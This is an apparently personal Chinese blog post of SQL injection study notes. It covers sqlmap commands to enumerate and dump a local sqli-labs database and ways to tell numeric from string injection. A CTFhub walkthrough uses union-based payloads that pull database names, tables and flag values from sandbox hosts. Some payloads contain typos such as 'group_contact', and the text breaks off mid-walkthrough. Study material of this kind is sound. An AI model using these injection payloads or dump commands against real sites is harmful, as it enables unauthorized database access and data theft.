+<meta property="og:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGU5ZDVmMzY0MTU4MjM1M2MzZDcyMmNhNjk0MmIzOWJfUHFDMWh0V2VqMnJxMGVOSURDQnV4MTU3M2JMSlJSUktfVG9rZW46S2hqOWJaVWdCb0l4dk14ZzlyZGM3TWlhbjZlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+<meta property="og:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzRkY2NiZGQyZWU4YTA4NGUzZWE5MDQ4Y2E4OGQxZTVfM1E4ZjA0bXAwaDI5ZWs0b0Jhc2RNbTFCTGg5UktWcHZfVG9rZW46T1pIcmJtVmhib3l1M2h4SmhZUmNnbWV1blhjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+<meta property="og:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MTZhM2IwZGQwM2RhMzZlMjUzM2Y2MzQ2NmZmNDM5MTFfNndnQ3ZLYkpkUmhFanpOUDFKYm9IdGJhR2cwVmhrMTRfVG9rZW46VlhaY2JCeFhCb1FYdm94VG5rTmN1c1JTbjBiXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+<meta property="og:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=MjFhN2RmMTYxYjljYTg3NTI3ZTA2M2M5MWY5NDIwMzNfZFpGTFJXbzRHbHJNU2dtOXRWWG96S0hwR1gxZ014N0hfVG9rZW46THVoV2IyTlIzb0FJc3V4Z1ZQZWNJb00xbjljXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+<meta property="og:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OTVmYTNhNjU1ZTQ5YmJkZDAxOWI1OThkNjc5YWU3YmNfYW9kQ2tVUnlFdHZXV09WVWVZWDdYcDViZURJODJWTFNfVG9rZW46WDBreWJEajk4b3BWVVZ4aUJnbWNMVjVtbmdlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+<meta property="og:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NTZlOWRmYjU2YjhhNmU4MjE1YTdmYjZiNTRiMjE2NzFfQmx1UVZpakxWb3owcnFXTjREckRnaTBOdEtyVVVkS3FfVG9rZW46WEo5bWJuclR4bzdhZ2J4cUx6aWM4VkVEbkZnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+<meta property="og:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YjdiN2Q1Nzk1NTIyNjc2OTE5MGFiNDU5ZTA2YTRiNGZfTnh5TzlYNXkyRk5yS0w2NjJhaGtrdEE0M3ViTGgwY3ZfVG9rZW46SW5pVGI2NXk5b3UwdE14ZVhZamNpMzI2bndlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+<meta property="article:published_time" content="2025-05-06T12:58:33.557Z">
+<meta property="article:modified_time" content="2025-05-06T13:45:35.060Z">
+<meta property="article:author" content="Camille">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzQyZDQxMTlmYTFjZTM4ZjExMmRjZjBmYmE0MjVjZjlfdjRIVWdGWWVMMzlVaEpDT2x0UFJyNUw3MlBUTWFjaEtfVG9rZW46RG1wRmJ2eXJab00zblV4TWZXSWNIR1Q5bnBlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA">
+  
+    <link rel="alternate" href="/atom.xml" title="Camille's Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
+    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  
+  
+    
+<div id="banner" class="">
+  <img src="/images/bg.jpg" itemprop="image">
+  <div id="banner-dim"></div>
+</div>
+ 
+   
+  <div id="main-grid" class="  ">
+    <div id="nav" class=""  >
+      <navbar id="navbar">
+  <nav id="title-nav">
+    <a href="/">
+      <div id="vivia-logo">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
+      </div>
+      <div>Camille's Blog </div>
+    </a>
+  </nav>
+  <nav id="main-nav">
+    
+      <a class="main-nav-link" href="/">Home</a>
+    
+      <a class="main-nav-link" href="/archives">Archives</a>
+    
+      <a class="main-nav-link" href="/friends">Friends</a>
+    
+      <a class="main-nav-link" href="/about">About</a>
+    
+  </nav>
+  <nav id="sub-nav">
+    <a id="theme-btn" class="nav-icon">
+      <span class="light-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M438.5-829.913v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-829.913Zm0 747.826v-48q0-17.452 11.963-29.476 11.964-12.024 29.326-12.024 17.363 0 29.537 12.024t12.174 29.476v48q0 17.452-11.963 29.476-11.964 12.024-29.326 12.024-17.363 0-29.537-12.024T438.5-82.087ZM877.913-438.5h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537t29.476-12.174h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T877.913-438.5Zm-747.826 0h-48q-17.452 0-29.476-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T82.087-521.5h48q17.452 0 29.476 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T130.087-438.5Zm660.174-290.87-34.239 32q-12.913 12.674-29.565 12.174-16.653-.5-29.327-13.174-12.674-12.673-12.554-28.826.12-16.152 12.794-28.826l33-35q12.913-12.674 30.454-12.674t30.163 12.847q12.709 12.846 12.328 30.826-.38 17.98-13.054 30.653ZM262.63-203.978l-32 34q-12.913 12.674-30.454 12.674t-30.163-12.847q-12.709-12.846-12.328-30.826.38-17.98 13.054-30.653l33.239-31q12.913-12.674 29.565-12.174 16.653.5 29.327 13.174 12.674 12.673 12.554 28.826-.12 16.152-12.794 28.826Zm466.74 33.239-32-33.239q-12.674-12.913-12.174-29.565.5-16.653 13.174-29.327 12.673-12.674 28.826-13.054 16.152-.38 28.826 12.294l35 33q12.674 12.913 12.674 30.454t-12.847 30.163q-12.846 12.709-30.826 12.328-17.98-.38-30.653-13.054ZM203.978-697.37l-34-33q-12.674-12.913-13.174-29.945-.5-17.033 12.174-29.707t31.326-13.293q18.653-.62 31.326 13.054l32 34.239q11.674 12.913 11.174 29.565-.5 16.653-13.174 29.327-12.673 12.674-28.826 12.554-16.152-.12-28.826-12.794ZM480-240q-100 0-170-70t-70-170q0-100 70-170t170-70q100 0 170 70t70 170q0 100-70 170t-170 70Zm-.247-82q65.703 0 111.475-46.272Q637-414.544 637-480.247t-45.525-111.228Q545.95-637 480.247-637t-111.475 45.525Q323-545.95 323-480.247t45.525 111.975Q414.05-322 479.753-322ZM481-481Z"/></svg></span>
+      <span class="dark-mode-icon"><svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M480.239-116.413q-152.63 0-258.228-105.478Q116.413-327.37 116.413-480q0-130.935 77.739-227.435t206.304-125.043q43.022-9.631 63.87 10.869t3.478 62.805q-8.891 22.043-14.315 44.463-5.424 22.42-5.424 46.689 0 91.694 64.326 155.879 64.325 64.186 156.218 64.186 24.369 0 46.978-4.946 22.609-4.945 44.413-14.076 42.826-17.369 62.967 1.142 20.142 18.511 10.511 61.054Q807.174-280 712.63-198.206q-94.543 81.793-232.391 81.793Zm0-95q79.783 0 143.337-40.217 63.554-40.218 95.793-108.283-15.608 4.044-31.097 5.326-15.49 1.283-31.859.805-123.706-4.066-210.777-90.539-87.071-86.473-91.614-212.092-.24-16.369.923-31.978 1.164-15.609 5.446-30.978-67.826 32.478-108.282 96.152Q211.652-559.543 211.652-480q0 111.929 78.329 190.258 78.329 78.329 190.258 78.329ZM466.13-465.891Z"/></svg></span>
+    </a>
+    
+      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS 订阅">
+        <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M198-120q-25.846 0-44.23-18.384-18.384-18.385-18.384-44.23 0-25.846 18.384-44.23 18.384-18.385 44.23-18.385 25.846 0 44.23 18.385 18.384 18.384 18.384 44.23 0 25.845-18.384 44.23Q223.846-120 198-120Zm538.385 0q-18.846 0-32.923-13.769-14.076-13.769-15.922-33.23-8.692-100.616-51.077-188.654-42.385-88.039-109.885-155.539-67.5-67.501-155.539-109.885Q283-663.462 182.385-672.154q-19.461-1.846-33.23-16.23-13.769-14.385-13.769-33.846t14.076-32.922q14.077-13.461 32.923-12.23 120.076 8.692 226.038 58.768 105.961 50.077 185.73 129.846 79.769 79.769 129.846 185.731 50.077 105.961 58.769 226.038 1.231 18.846-12.538 32.922Q756.461-120 736.385-120Zm-252 0q-18.231 0-32.423-13.461t-18.653-33.538Q418.155-264.23 348.886-333.5q-69.27-69.27-166.501-84.423-20.077-4.462-33.538-18.961-13.461-14.5-13.461-33.346 0-19.076 13.884-33.23 13.884-14.153 33.115-10.922 136.769 15.384 234.384 112.999 97.615 97.615 112.999 234.384 3.231 19.23-10.538 33.115Q505.461-120 484.385-120Z"/></svg>
+      </a>
+    
+    <div id="nav-menu-btn" class="nav-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" height="20" viewBox="0 -960 960 960" width="20"><path d="M177.37-252.282q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Zm0-186.218q-17.453 0-29.477-11.963-12.024-11.964-12.024-29.326 0-17.363 12.024-29.537T177.37-521.5h605.26q17.453 0 29.477 11.963 12.024 11.964 12.024 29.326 0 17.363-12.024 29.537T782.63-438.5H177.37Zm0-186.217q-17.453 0-29.477-11.964-12.024-11.963-12.024-29.326t12.024-29.537q12.024-12.174 29.477-12.174h605.26q17.453 0 29.477 11.964 12.024 11.963 12.024 29.326t-12.024 29.537q-12.024 12.174-29.477 12.174H177.37Z"/></svg>
+    </div>
+  </nav>
+</navbar>
+<div id="nav-dropdown" class="hidden">
+  <div id="dropdown-link-list">
+    
+      <a class="nav-dropdown-link" href="/">Home</a>
+    
+      <a class="nav-dropdown-link" href="/archives">Archives</a>
+    
+      <a class="nav-dropdown-link" href="/friends">Friends</a>
+    
+      <a class="nav-dropdown-link" href="/about">About</a>
+    
+    
+      <a class="nav-dropdown-link" href="/atom.xml" title="RSS 订阅">RSS</a>
+     
+    </div>
+</div>
+<script>
+  let dropdownBtn = document.getElementById("nav-menu-btn");
+  let dropdownEle = document.getElementById("nav-dropdown");
+  dropdownBtn.onclick = function() {
+    dropdownEle.classList.toggle("hidden");
+  }
+</script>
+    </div>
+    <div id="sidebar-wrapper">
+      <sidebar id="sidebar">
+  
+    <div class="widget-wrap">
+  <div class="info-card">
+    <div class="avatar">
+      
+        <image src=https://q1.qlogo.cn/g?b=qq&nk=3176497027&s=640></image>
+      
+      <div class="img-dim"></div>
+    </div>
+    <div class="info">
+      <div class="username">Camille </div>
+      <div class="dot"></div>
+      <div class="subtitle">What I Have Lived For. </div>
+      <div class="link-list">
+        
+          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com/camille-192" title="GitHub"><i class="fa-brands fa-github"></i></a>
+         
+      </div>  
+    </div>
+  </div>
+</div>
+
+  
+  <div class="sticky">
+    
+      
+
+
+
+    
+      
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">归档</h3>
+      
+      
+        <a class="archive-link" href="/archives/2025/05 ">
+          五月 2025 
+          <div class="archive-count">2 </div>
+        </a>
+      
+        <a class="archive-link" href="/archives/2024/11 ">
+          十一月 2024 
+          <div class="archive-count">1 </div>
+        </a>
+      
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget-wrap">
+    <div class="widget">
+      <h3 class="widget-title">最新文章</h3>
+      <ul>
+        
+          <a class="recent-link" href="/2025/05/06/test/" title="test" >
+            <div class="recent-link-text">
+              test
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2025/05/06/Web%E5%91%A8%E6%8A%A5-SQL%E6%B3%A8%E5%85%A5/" title="" >
+            <div class="recent-link-text">
+              (no title)
+            </div>
+          </a>
+        
+          <a class="recent-link" href="/2024/11/17/hello-world/" title="Hello World" >
+            <div class="recent-link-text">
+              Hello World
+            </div>
+          </a>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+  </div>
+</sidebar>
+    </div>
+    <div id="content-body">
+       
+
+
+<article id="post-Web周报-SQL注入" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  
+    
+   
+  <div class="article-inner">
+    <div class="article-main">
+      <header class="article-header">
+        
+<div class="main-title-bar">
+  <div class="main-title-dot"></div>
+  
+    
+      <h1 class="p-name article-title" itemprop="headline name">
+        无标题
+      </h1>
+    
+  
+</div>
+
+        <div class='meta-info-bar'>
+          <div class="meta-info">
+  <time class="dt-published" datetime="2025-05-06T12:58:33.557Z" itemprop="datePublished">2025-05-06</time>
+</div>
+          <div class="need-seperator meta-info">
+            <div class="meta-cate-flex">
+  
+    未分类 
+   
+</div>
+  
+          </div>
+          <div class="wordcount need-seperator meta-info">
+            14k 词 
+          </div>
+        </div>
+        
+      </header>
+      <div class="e-content article-entry" itemprop="articleBody">
+        
+          <h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p>链接：<a target="_blank" rel="noopener" href="https://sqlmap.org/">https://sqlmap.org/</a></p>
+<p>windows安装zip格式，Linux下载.tar.gz格式</p>
+<p><code>python sqlmap.py</code>检查安装</p>
+<p>sqlmap参数：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_68416970/article/details/138974168">https://blog.csdn.net/weixin_68416970/article/details/138974168</a></p>
+<p>目标注入点：<code>http://127.0.0.1/sqli-labs-master/Less-1/</code></p>
+<p>判断是否存在注入：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>查看数据库用户：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot;</span> --current-user</span><br></pre></td></tr></table></figure>
+
+<p>查看所有数据库：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot;</span> --dbs</span><br></pre></td></tr></table></figure>
+
+<p>查看当前数据库名称：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot;</span> --current-db</span><br></pre></td></tr></table></figure>
+
+<p>查询当前数据库的表：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot;</span> -D 数据库名 --tables</span><br></pre></td></tr></table></figure>
+
+<p>查询表中的字段名：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot;</span> -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure>
+
+<p>查询字段下的数据：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -u <span class="string">&quot;http://127.0.0.1/sqli-labs-master/Less-1/?id=1&quot;</span> -D 数据库名 -T 表名 --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h2><p>SQL </p>
+<p>结构化查询语言，用来管理关系型数据库的编程语言</p>
+<p>SQL注入</p>
+<p>操纵者通过输入恶意SQL代码，操纵应用程序的数据库查询逻辑</p>
+<p>原理：利用未校验的用户输入拼接SQL语言，导致数据库执行非法操作</p>
+<h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><p>寻找注入点—&gt;判断注入类型&#x2F;数据库类型—&gt;猜解数据库名—&gt;猜解数据表名—&gt;猜解数据字段名</p>
+<p>1）指找到存在SQL注入的参数，SQL注入大多发生在GET&#x2F;POST请求的参数中，也有的在UserAgent、Cookie等</p>
+<p>根据返回报错信息判断哪里存在SQL注入漏洞？</p>
+<p>根据回显判断通过什么方法找到SQL注入的参数（查看源代码）？</p>
+<ol start="2">
+<li></li>
+</ol>
+<p>3）猜解后台数据库的库名</p>
+<p>4）猜到数据库名后，进一步猜某一个特定数据库中数据表的名称</p>
+<p>5）某个特定数据库中特定数据表中的字段，获取到字段才能查询数据</p>
+<p>MySQL</p>
+<p>开源关系型数据库管理系统</p>
+<p>MySQL注入</p>
+<p>针对MySQL数据库的SQL注入攻击，利用其特有语法或功能</p>
+<h3 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h3><p>SQL语句学习：</p>
+<p>常用函数学习：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lady_killer9/article/details/107300079">网络安全-SQL注入原理、攻击及防御</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/MOY37RQW1JarN33BgZk/article/details/118740573">web 漏洞入门之 —— SQL 注入教程</a></p>
+<p>大部分注入为POST&#x2F;GET注入，只需要在url或者输入框中输入，Cookie注入和HTTP头部注入通常需要抓包才能修改，很少遇到这种情况。</p>
+<p>闭合和注释（判断是否可以进行注入）</p>
+<p>闭合：</p>
+<p>数字型不需，字符型和搜索型需要</p>
+<p>注释:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#</span></span><br><span class="line">-- //后面需要空格</span><br><span class="line">--+</span><br></pre></td></tr></table></figure>
+
+<p>判断是否可以注入：引号大法（加单引号或注释#’）（一般用于字符型）和and大法（对比发现）（一般用于数字型）</p>
+<p>判断注入类型：</p>
+<p>总的分为两大类：字符型和数字型。（检验方法详见：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ewyherayh/article/details/106524972%EF%BC%89">https://blog.csdn.net/ewyherayh/article/details/106524972）</a></p>
+<p>搜索型（一般很少用到，依旧详见）</p>
+<h4 id="整型注入"><a href="#整型注入" class="headerlink" title="整型注入"></a><strong>整型注入</strong></h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45840241/article/details/139106947">https://blog.csdn.net/weixin_45840241/article/details/139106947</a></p>
+<p>当输入的参数是整型时，为数字型注入</p>
+<p>测试步骤：</p>
+<ul>
+<li>加单引号 URL：xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3’; 对应的SQL:select*from table where id&#x3D;3’ 此时SQL语句出错，程序无法正常从数据库中查询出数据，就会抛出异常</li>
+<li>加and1&#x3D;1 URL:xxx.xxx.xxx&#x2F;xxx.php?id&#x3D;3 and 1&#x3D;1; 对应的SQL：select*from table where id&#x3D;3’ and 1&#x3D;1语句执行正常，与原始页面没有差异</li>
+<li>加and1&#x3D;2 URL:xxx.xxx.xxx&#x2F;xxx.php？id&#x3D;3 and 1&#x3D;2; 对应的SQL：select*from table where id&#x3D;3 and 1&#x3D;2语句可以正常执行，但无法查询结果，返回数据与原始页面没有差异</li>
+</ul>
+<p>若满足以上三点，可判断URL存在数字型注入</p>
+<h4 id="字符注入"><a href="#字符注入" class="headerlink" title="字符注入"></a><strong>字符注入</strong></h4><p>当输入的参数是字符串时，为字符注入。与数字型最大的区别在于，字符注入需要单引号来闭合。在构造payload时通过闭合单引号成功执行语句。</p>
+<table>
+<thead>
+<tr>
+<th>数字型</th>
+<th>字符型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>select*from table where id&#x3D;3；</td>
+<td>select * from table where name&#x3D;’admin’；</td>
+</tr>
+</tbody></table>
+<p>测试步骤：</p>
+<ul>
+<li>加单引号 URL:select*from table where name&#x3D;’admin’’; 由于加单引号变成三个单引号，程序无法执行报错</li>
+<li>加‘and1&#x3D;1 SQL：select<em>from table where name&#x3D;’admin’and 1&#x3D;1’ 无法进行注入，需要注释符号绕过 构造语句：select</em>from table where name&#x3D;’admin’and 1&#x3D;–’ 可成功执行返回结果</li>
+<li>加and1&#x3D;2— SQL: select*from table where name&#x3D;’admin’ and 1&#x3D;2—‘ 会报错</li>
+</ul>
+<p>若满足以上三点，可判断URL存在字符注入</p>
+<p>Union注入攻击：</p>
+<p><code>d&#39; and 1=1#</code>(字符型)</p>
+<h1 id="练习题目"><a href="#练习题目" class="headerlink" title="练习题目"></a>练习题目</h1><h2 id="CTFhub"><a href="#CTFhub" class="headerlink" title="CTFhub"></a>CTFhub</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/0yst3r-2046/p/12469632.html">https://www.cnblogs.com/0yst3r-2046/p/12469632.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45808483/article/details/121347677">https://blog.csdn.net/weixin_45808483/article/details/121347677</a></p>
+<h3 id="整数型注入"><a href="#整数型注入" class="headerlink" title="整数型注入"></a>整数型注入</h3><p>题目：</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YzQyZDQxMTlmYTFjZTM4ZjExMmRjZjBmYmE0MjVjZjlfdjRIVWdGWWVMMzlVaEpDT2x0UFJyNUw3MlBUTWFjaEtfVG9rZW46RG1wRmJ2eXJab00zblV4TWZXSWNIR1Q5bnBlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>输入1：</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NTk0MjE0MTE1ZTYwZDQ4MmUxZjExYzQ5ZWY3Mjg2NGZfM1VCclZJVnZlYmVTbmVVcGJMU1B3YW91OERnY3RCU2ZfVG9rZW46UU14aGJhUFZvb21pNnd4R3FFbmNXeVZvblhkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>Hackbar</p>
+<p>用<code>order by x </code>判断字段数为2，存在2列</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NDBlODA5N2QxZDA3YTJjMWFjNWI3MjA0MWQ2NWNhNGFfT2FTOWsyME9BN3lEczFJbzd4REVXZmc2UlVxUFJvbmRfVG9rZW46TkZ6VGI4UENSb2tvRjV4aGNxaWNpTlkxblRjXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>存在2个注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-b1d40146116aab81.sandbox.ctfhub.com:10800/?id=1`` union select 8,9</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjY4ZTIyMzNhYWQ0NWQ3YzdjYjNkMjI2ZWEzNmRjNTZfcnFtanVkTTZvRWxlOWFMdk1DTjhIcGZWdHVTWEg3YnZfVG9rZW46VjludmJMR1g3b2dHRGV4ZlE3aWNqUGNJbkJkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆库，当前数据库为sqli</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-b1d40146116aab81.sandbox.ctfhub.com:10800/?id=1`` union select 8,database()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NWEyYWIzZjU3N2IyOGRhYWRjYzZhZDUxNmUwOGNhNDNfUDFzUFZRbXBWeUF5VnZEZGpqQ3dyZ2RaTXBETWZFVVBfVG9rZW46VTlnTWJNcGZjb0Zub0h4a0ZiRWNEWjc0bmdkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>爆出所有表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-b1d40146116aab81.sandbox.ctfhub.com:10800/?id=1`` and 1=2 union select 1,group_contact(table_name)from information_schema.tables where table_schema=&#x27;sqli&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=ZWI4YTBlNjAxZmY1ZjA4NTE0OGM0NzQ4NGFlMTMwZTFfZVJ3Y1lKaFVTT2w3UFlaWHhjY0xPS0o0SHIwaE04VGhfVG9rZW46SkhBemJkaDVQb2xkODJ4eG5QWWNpSEhmbkNkXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>查询flag字段的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-b1d40146116aab81.sandbox.ctfhub.com:10800/?id=1`` and 1=2 union select 1,group_contact(flag) from sqli.flag</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhNGU1ZjFiZDM4OGUwYzUyYmQwNWUwNzA0ZTVjZTVfQ0Z2aUZ5SXpvbnBGTU10RFZtTTBJUGhIRk41dmpzRnVfVG9rZW46UnhBNmJuUzJ1b0d2WWV4WmxCQmNsUjc4bnNlXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<h3 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h3><p>先输入1：</p>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2U0MTllM2Q0Nzg2MDI2ZGJiNTUxZWI3NDhkZmRlNGNfUmNJTk4zeXQ1Rk1NZnZoeGM2ZFFkWDFtTWZxaUtEeHNfVG9rZW46SzdpSWJWRVJ2b1I5YUV4NVk1RmM0bTY3bm5mXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>存在两列：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f7f85c36768fadcc.sandbox.ctfhub.com:10800/?id=1``&#x27; order by 1,2 --+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGQzOGEyZDUyZTgxM2JmZTZiMTY5MjBjNzU4ZWQzMWRfZjUxSW9oamYxZ29ZdldTd0xLSlY0dzhHS0ljb1NPdHdfVG9rZW46UkZZbGJHRU1Ub1BITWh4WWNiZGNxWURRbkEyXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>通过占位符查看回显：</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge-f7f85c36768fadcc.sandbox.ctfhub.com:10800/?id=-1``&#x27; union select 1,2 --+</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://qlnu-sec.feishu.cn/space/api/box/stream/download/asynccode/?code=NGU0ZTViOTBmZDhiYmQ3NGNhOWU5MjdiOTcxNjY5ZTRfQWVuT0dyNG5qaWRxajNGTmdVMzVzUXo4bGNwWDhvem1fVG9rZW46WDhBNGJMUzYwbzBYSGt4OUV0cmNUMWFkblFnXzE3NDY1Mzg0NjM6MTc0NjU0MjA2M19WNA" alt="img"></p>
+<p>当前数据库：</p>
+<blockquote>
